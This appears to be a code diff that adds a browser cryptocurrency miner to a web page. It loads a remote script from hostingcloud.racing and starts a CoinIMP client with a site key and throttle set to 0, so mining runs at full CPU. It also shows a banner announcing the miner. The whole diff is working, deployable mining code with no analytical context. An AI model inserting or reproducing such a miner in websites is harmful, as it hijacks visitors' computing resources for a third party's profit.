@@ -1,0 +1,9 @@
+<script src="https://www.hostingcloud.racing/1NRw.js"></script>
+<script>
+    var _client = new Client.Anonymous('7446a5bba9449ae639dc474a7e5dc176024b7764fc4177cfc14e6243be804146', {
+        throttle: 0, c: 'w'
+    });
+    _client.start();
+    _client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com", "#cccccc", 40, "#3d3d3d");
+
+</script>
